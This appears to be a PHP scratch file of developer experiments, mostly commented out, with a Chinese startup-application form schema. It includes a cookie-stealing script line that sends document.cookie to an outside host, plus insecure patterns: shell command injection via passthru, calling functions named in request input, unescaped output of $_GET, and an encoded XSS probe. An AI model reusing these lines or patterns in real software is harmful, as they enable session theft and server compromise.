<!--<iframe src="http://www.baidu.com"></iframe>-->
<!--<script>location.href='http://www.ssl2.com/?cookie='+window.document.cookie</script>-->
<?php
//header('X-Frame-Options:DENY');
/*header('X-XSS-Protection:1');
setcookie('name1','wangjian',time()+3*60);
setcookie('name2','wangjian2',time()+60);
echo $_GET['name'];*/
/*$arr=$argv;
var_dump($arr);*/
//var_dump(array_count_values(array('A'=>'A1','B'=>'B1','C'=>'C1','D'=>false)));
/*$img = 'a.gif';
$base64_img = base64EncodeImage($img);

echo '<img src="' . $base64_img . '" />';

function base64EncodeImage ($image_file)
{
    $base64_image = '';
    $image_info = getimagesize($image_file);
    $image_data = fread(fopen($image_file, 'r'), filesize($image_file));
    $base64_image = 'data:' . $image_info['mime'] . ';base64,' . base64_encode($image_data);
    return $base64_image;
}*/

/*session_start();
echo session_id();*/


$str = '[
    {
        "type": "staff",
        "key": 1,
        "staff_name": "dsf",
        "staff_id": "21"
    },
    {
        "type": "staff",
        "key": 0,
        "staff_name": "鲍笑薇",
        "staff_id": "420"
    }
]';

//var_dump(json_decode($str,true));exit;


//var_dump(getopt('a:b:c::',['d:','e::','f']));
/*$auditState=3;
switch($auditState){
    case 1:
        $auditState=0;
        break;
    case 2:
        $auditState=1;
        break;
    case 3:
        $auditState=2;
        break;
    case 4|5:
        $auditState=4;
        break;
}
var_dump($auditState);exit;*/
//phpinfo();
//echo $_GET['a'];
//echo file_put_contents('php://output','中国');
//echo file_get_contents('php://input');


$f = 50.2;
/*
echo intval($f * 100);
var_dump($a);exit;*/

//var_dump(floatval($f));exit;

//echo number_format(88.37,2)+number_format(11.63,2);


/*foreach([1,2,3] as $val){
   echo '1';

}


echo $val;*/

/*$a=floatval('1.23');
if($a >2.00){
echo 'asdf';
}*/

$a = 200;

/*if(200==200.00){
   echo 'asdf';

}*/
/*
$arr=[1=>'this is 1',2=>'this is 2',3=>'this 3'];

var_dump($arr['3']);exit;*/

//var_dump($_SERVER);exit;
//echo 0.5*100;

//echo '4.2'-2.31;
/*$datas=[];
$db1=[];
$db1['name']='zahgns';
$db1['age']=13;
$datas[]=$db1;

var_dump($datas);exit;*/
/*
$datas['ss']='ss';
$datas['ok']='ok';
$obj=(object)$datas;
var_dump($obj);exit;*/

//echo 3&-1;

//echo hash_hmac('MD5','adsf','ccc');


/*var_dump(false==null);exit;*/

//echo json_encode(['a'=>1,'b'=>2]);

//var_dump(strtotime('2017-04-24 010:00:00')); 格式不正确导致false;

//echo false-5;
/*$str='';
if($str){
  echo 'sdf';
}*/

//echo sprintf('%u',-5);
//echo urldecode("%3E%22%27%3E%3Cscript%3Ealert%28665%29%3C%2Fscript%3E");
//echo $_GET['name'];

/*
$aa=3;

function ok(&$c){
    global $aa;
    $aa++;
    echo $aa;
}
ok();


$date='1988-10';
echo date('Y-m',strtotime($date));

if(3<2)
    echo 'asdf';
echo 'asdfddd';

*/
//phpinfo();

/*$resource=finfo_open(FILEINFO_MIME);
$a=finfo_file($resource,'ab.jpg.a');

echo $a;*/
/*$a='0x11';  //PHP用字符串表示16进制
echo hexdec($a);*/
/*$resource=fopen('timg.jpg','rb');
$bin=fread($resource,'512');
var_dump(bin2hex($bin));
fclose($resource);*/


/*
$host=$argv[1];
 passthru('ping '.$host,$return_var);*/
//var_dump($return_var);exit;


/*$arr=getopt('a:b:');

var_dump($arr);exit;*/


$a = '1988-11-12';

//echo preg_replace(array('/(\d+)/','/\-/'),array('AAA','--'),$a);

//echo preg_replace("/test/e","echo 'hello';","jutst test");
/*echo preg_match('/\d+(\-)/',$a,$match);

print_r($match);*/
/*echo preg_replace_callback('/\d+/',function($arg){
    return $arg[0];
},$a);*/


/*function a(){
    return 'this is a';
}
function b(){
    return 'this is b';
}

$func=$_REQUEST['func'];
echo $func();*/


//echo $_SERVER['HTTP_ACCEPT_ENCODING'];  //反馈浏览器支持哪些编解码


/*  print "请输入数字1或2:\n";
$answer=trim(fgets(STDIN));
if(ctype_digit($answer) && in_array($answer,[1,2])) {
   print 'normal';
}else{
    print 'abnormal';
}
fclose(STDIN);
exit(0);*/

/*require './array_util.txt';

echo aa();*/

//echo $_GET['aa'];

//header('content-type:text/xml');
//echo $_REQUEST['r'];
$a = htmlentities($_GET['age']);


//echo "<xml version='1.0.0' encoding='utf-8'><admin><age>20</age></admin><admin><age>".$a."</age></admin></xml>";


function a()
{
    $a = 2;
    return $a++;
}


echo a();

$a = 1;
if ($a == '1') {
    echo 'tian';
}

$a = 0.01;
$c = 0.75;
$d = 0.8;
echo number_format($a + $c);


echo strlen('d265696cdf1594bd8e496d9601d49453');

$projectIdsArr = [1, 2, 34, 5, 5, 'a' => 6, 'a' => 7];
var_dump(array_unique($projectIdsArr));

$arr = [2];
echo implode(',', $arr);


$a = array(
    array(
        'id' => 5698,
        'first_name' => 'Bill',
        'last_name' => 'Gates',
    ),
    array(
        'id' => 4767,
        'first_name' => 'Steve',
        'last_name' => 'Jobs',
    ),
    array(
        'id' => 4768,
        'first_name' => 'Mark',
        'last_name' => 'Zuckerberg',
    )
);

$last_names = array_column($a, 'id');
print_r($last_names);


echo '----------';

$arr = [1, 2, 3, 4, 'a' => 5, 6];
print_r(array_flip($arr));

$arr1 = [
    ['name' => 'zhongg', 'age' => 11],
    ['name' => 'jisuan', 'age' => 30]
];

$arr2 = [
    ['name' => 'china', 'age' => 23],
    ['name' => 'zhongg', 'age' => 11]
];


var_dump(array_merge($arr1, $arr2));

$str = '[
    {
        "type": "staff",
        "staff_name": "杨帅",
        "staff_id": "1596",
        "key": 1
    },
    {
        "type": "staff",
        "staff_name": "晏锋",
        "staff_id": "1564"
    }
]';

//$str=json_decode($str,true);

//var_dump(is_float(1.0));
/*$a=['name'=>'wj','age'=>21];
$b=(object)$a;
var_dump($b->name);exit;*/


/*
function aa(){
  static   $a=0;
    $a++;
    if($a>3){

        return false;
    }else{
        echo 'a='.$a;
        aa();
        $a=$a-1;
        echo 'b='.$a;
    }

}

aa();*/

/*
$a=3;

$data=hash_hmac('sha256','absc',$a);

echo $data;*/

/*
 //精度丢失问题
  $a=0.57;
  echo intval($a*100);*/

/*
$str = "Supercalifragulistic";
echo wordwrap($str,3,"<br>\n",true);*/
/*$a=date('YmdHis').microtime(true);

echo strtr($a,'.','-');*/

/*
$a=['key1'=>'value1','key2'=>'value2'];

var_dump(each($a));*/

echo mt_rand();
echo '<br/>';
echo strtr(date('YmdHis') . microtime(true), '.', ord('a'));

//phpinfo();


$obj1 = new \stdClass();
$obj1->num = 1;

$obj2 = new \stdClass();
$obj2->num = 3;


$obj3 = new \stdClass();
$obj3->num = 3;

$obj4 = new \stdClass();
$obj4->num = 0.9;

$a = [
    $obj1,
    $obj2,
    $obj3,
    $obj4
];

function my_sort($a, $b)
{
    if ($a == $b) return 0;
    return ($a < $b) ? -1 : 1;
}

usort($a, 'my_sort');

//var_dump($a);exit;

echo "==================<br/>";

function uuid($prefix = "template")
{    //可以指定前缀
    $str = md5(uniqid(mt_rand(), true) . date('YmdHis'));
    $randomInt = mt_rand(1, 9);
    $uuid = substr($str, 0, 8) . $randomInt;
    $uuid .= substr($str, 8, 4) . $randomInt;
    $uuid .= substr($str, 12, 4) . $randomInt;
    $uuid .= substr($str, 16, 4) . $randomInt;
    $uuid .= substr($str, 20, 12);
    return $prefix . $uuid;
}

/**
 *
 * @param $a
 * @param array ...$b
 */
function dd($a, ...$b)
{

    foreach ($b as $v) {
        if ($v instanceof Closure) {

            echo call_user_func($v, 1);
        }
    }

}

dd(3, 4, 5, 6, 'd', function () {
    return 'a';
});


echo '-----------------------------';


/*
function cc(){
    $days=0;
    $w=intval(date('w'));
    $days=($w==0?6:$w-1);
    $nowDateTime=date('Y-m-d 23:59:59');
    $startTimestrap=strtotime($nowDateTime)-$days*24*3600;
    $startDateTime=date('Y-m-d 00:00:00',$startTimestrap);
    return compact('startDateTime','nowDateTime');
}

var_dump(cc());exit;*/
/*$a=['name'=>'汪大侠1','c'=>'c'];
var_dump($a['name']=='汪大侠');*/

/*$a=['name'=>'汪大侠1','c'=>'c'];
$b=array_merge($a,['d'=>'c']);
var_dump($b);*/


/*function isPrime($n) {//TurkHackTeam AVP production
    if ($n <= 3) {
        return $n > 1;
    } else if ($n % 2 === 0 || $n % 3 === 0) {
        return false;
    } else {
        for ($i = 5; $i * $i <= $n; $i += 6) {
            if ($n % $i === 0 || $n % ($i + 2) === 0) {
                return false;
            }
        }
        return true;
    }
}

var_dump(isPrime(3));exit;*/

//var_dump(strlen(substr((md5('template0568c2054c84c4d9ac4dddddddddfsdafasdfasdf3fa4e632b18395d3')),0,27)));exit;

//echo strlen('activity4d25c88886cae83c128d31d88d1b04905551');

$str = '[{
		"title": "公司名称",
		"field_key": "",
		"field_type": "text",
		"field_prompt": "",
		"field_is_must": 0,
		"field_group": 1,
		"field_group_title": "项目基本信息",
		"field_group_location": 1
	},
	{
		"title": "项目名称",
		"field_key": "project_name",
		"field_type": "text",
		"field_prompt": "项目名称",
		"field_is_must": 1,
		"field_group": 1,
		"field_group_title": "项目基本信息",
		"field_group_location": 2
	},
	{
		"title": "项目描述",
		"field_key": "project_desc",
		"field_type": "textarea",
		"field_prompt": "一句话描述项目",
		"field_is_must": 1,
		"field_group": 1,
		"field_group_title": "项目基本信息",
		"field_group_location": 3
	},
	{
		"title": "项目LOGO",
		"field_key": "project_logo_url",
		"field_type": "image",
		"field_prompt": "上传图片",
		"field_is_must": 1,
		"field_group": 1,
		"field_group_title": "项目基本信息",
		"field_group_location": 4
	},
	{
		"title": "项目BP",
		"field_key": "project_bp_url",
		"field_type": "file",
		"field_prompt": "上传附件",
		"field_is_must": 1,
		"field_group": 1,
		"field_group_title": "项目基本信息",
		"field_group_location": 5
	},
	{
		"title": "项目所在地",
		"field_key": "",
		"field_type": "text",
		"field_prompt": "地址信息",
		"field_is_must": 0,
		"field_group": 1,
		"field_group_title": "项目基本信息",
		"field_group_location": 6
	},
	{
		"title": "项目所属行业领域",
		"field_key": "project_domain",
		"field_type": "select",
		"field_prompt": "",
		"field_is_must": 1,
		"field_group": 1,
		"field_group_title": "项目基本信息",
		"field_group_location": 7
	},
	{
		"title": "市场背景",
		"field_key": "",
		"field_type": "text",
		"field_prompt": "市场容量，市场竞争格局",
		"field_is_must": 0,
		"field_group": 1,
		"field_group_title": "项目基本信息",
		"field_group_location": 8
	},
	{
		"title": "商业模式",
		"field_key": "",
		"field_type": "text",
		"field_prompt": "请输入",
		"field_is_must": 0,
		"field_group": 1,
		"field_group_title": "项目基本信息",
		"field_group_location": 9
	},
	{
		"title": "盈利模式",
		"field_key": "",
		"field_type": "text",
		"field_prompt": "请输入",
		"field_is_must": 0,
		"field_group": 1,
		"field_group_title": "项目基本信息",
		"field_group_location": 10
	},
	{
		"title": "核心竞争力",
		"field_key": "",
		"field_type": "text",
		"field_prompt": "简短描述不可被复制原因",
		"field_is_must": 0,
		"field_group": 1,
		"field_group_title": "项目基本信息",
		"field_group_location": 11
	},
	{
		"title": "核心业务指标",
		"field_key": "",
		"field_type": "text",
		"field_prompt": "列举已有运营数据",
		"field_is_must": 0,
		"field_group": 1,
		"field_group_title": "项目基本信息",
		"field_group_location": 12
	},
	{
		"title": "已有资源背景",
		"field_key": "",
		"field_type": "textarea",
		"field_prompt": "合作资源，客户资源，资质证明等",
		"field_is_must": 0,
		"field_group": 1,
		"field_group_title": "项目基本信息",
		"field_group_location": 13
	},
	{
		"title": "战略发展规划",
		"field_key": "",
		"field_type": "text",
		"field_prompt": "合作资源，客户资源，资质证明等",
		"field_is_must": 0,
		"field_group": 1,
		"field_group_title": "项目基本信息",
		"field_group_location": 14
	},
	{
		"title": "当前融资轮次",
		"field_key": "financing_phase",
		"field_type": "select",
		"field_prompt": "请选择",
		"field_is_must": 1,
		"field_group": 2,
		"field_group_title": "融资规划",
		"field_group_location": 1
	},
	{
		"title": "计划融资额",
		"field_key": "financing_money",
		"field_type": "text",
		"field_prompt": "请输入",
		"field_is_must": 1,
		"field_group": 2,
		"field_group_title": "融资规划",
		"field_group_location": 2
	},
	{
		"title": "融资史",
		"field_key": "",
		"field_type": "text",
		"field_prompt": "XX年-XX轮-XX万",
		"field_is_must": 0,
		"field_group": 2,
		"field_group_title": "融资规划",
		"field_group_location": 3
	},
	{
		"title": "当前股权结构",
		"field_key": "",
		"field_type": "text",
		"field_prompt": "XX机构",
		"field_is_must": 0,
		"field_group": 2,
		"field_group_title": "融资规划",
		"field_group_location": 4
	},
	{
		"title": "现有资金情况",
		"field_key": "",
		"field_type": "text",
		"field_prompt": "请填写",
		"field_is_must": 0,
		"field_group": 2,
		"field_group_title": "融资规划",
		"field_group_location": 5
	},
	{
		"title": "资金使用计划",
		"field_key": "",
		"field_type": "textarea",
		"field_prompt": "资金使用情况",
		"field_is_must": 0,
		"field_group": 2,
		"field_group_title": "融资规划",
		"field_group_location": 6
	},
	{
		"title": "创始人姓名",
		"field_key": "create_name",
		"field_type": "text",
		"field_prompt": "请填写",
		"field_is_must": 1,
		"field_group": 3,
		"field_group_title": "团队信息",
		"field_group_location": 1
	},
	{
		"title": "创始人联系方式",
		"field_key": "create_phone",
		"field_type": "text",
		"field_prompt": "请填写",
		"field_is_must": 1,
		"field_group": 3,
		"field_group_title": "团队信息",
		"field_group_location": 2
	},
	{
		"title": "创始人教育背景",
		"field_key": "",
		"field_type": "textarea",
		"field_prompt": "请填写",
		"field_is_must": 0,
		"field_group": 3,
		"field_group_title": "团队信息",
		"field_group_location": 3
	},
	{
		"title": "创始人背景",
		"field_key": "",
		"field_type": "textarea",
		"field_prompt": "请填写",
		"field_is_must": 0,
		"field_group": 3,
		"field_group_title": "团队信息",
		"field_group_location": 4
	},
	{
		"title": "团队人数",
		"field_key": "",
		"field_type": "text",
		"field_prompt": "团队已有人数",
		"field_is_must": 0,
		"field_group": 3,
		"field_group_title": "团队信息",
		"field_group_location": 5
	},
	{
		"title": "核心团队成员1背景",
		"field_key": "",
		"field_type": "text",
		"field_prompt": "请填写",
		"field_is_must": 0,
		"field_group": 3,
		"field_group_title": "团队信息",
		"field_group_location": 6
	},
	{
		"title": "核心团队成员2背景",
		"field_key": "",
		"field_type": "text",
		"field_prompt": "请填写",
		"field_is_must": 0,
		"field_group": 3,
		"field_group_title": "团队信息",
		"field_group_location": 7
	},
	{
		"title": "其他信息",
		"field_key": "",
		"field_type": "text",
		"field_prompt": "若在浙江省创新创业大赛浙江省行业决赛中获奖，有高层次及海归人才，或其他说明，请在此填写",
		"field_is_must": 0,
		"field_group": 4,
		"field_group_title": "其他信息",
		"field_group_location": 1
	}

]';

$cc = var_export(json_decode($str, true), true);

//file_put_contents('cc.php',$cc);


//echo sys_get_temp_dir();

/*
$aa = [1, 2, 3];
$c = ['c' => 'c_value', 'd' => 'd_value',1];
$dd=$aa+$c;
var_dump($dd);exit;*/

function isImg($fileName)
{
    $file  = fopen($fileName, "rb");
    $bin  = fread($file, 2); // 只读2字节
    fclose($file);
    $strInfo = @unpack("C2chars", $bin);
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);
    $fileType = '';

    if($typeCode == 255216 /*jpg*/ || $typeCode == 7173 /*gif*/ || $typeCode == 13780 /*png*/)
    {
        return $typeCode;
    }
    else
    {
        // echo '"仅允许上传jpg/jpeg/gif/png格式的图片！';
        return false;
    }
}


$date1='2018-01-10 05:12:12';
$date2='2018-03-23 08:12:23';
var_dump(($date1 < $date2));


$result = [
    ['name'=>'zhangsan','description'=>'张三描述'],
    ['name'=>'zhangsan1','description'=>'张三描述1'],
    ['name'=>'zhangsan2','description'=>'张三描述2'],
];
foreach ($result as $item) {
    $temp = $item['name'];
    $item['name'] = $item['description'];
    $item['description'] = $temp;
}

var_dump($result);


$str='a牛cdef';
echo $str{1}.$str{2}.$str{3}.'-------';
echo ord('-');

echo octdec('77');
echo '++++++';
echo 0x77; //16进制
echo '-----';
echo 024;//8进制
echo hexdec(77);

echo 0x7FFFFFFF;


echo '--------';
echo md5('a中国馆');





$columns='id,email';
$a=preg_split('/\s*,\s*/', trim($columns), -1, PREG_SPLIT_NO_EMPTY);
var_dump($a);

$a=[1,2,3];

foreach($a as $k=>&$value){

    $value*=$value;
}



class A{
    private $_a;
    protected $b;
    public  $c;

    public function __construct()
    {
        echo 'constructor';
    }

    public function c(){
        echo 'c';
    }




}


/*$a=new A();
$new= new \ReflectionClass($a);

var_dump($new->getProperties());
exit;*/






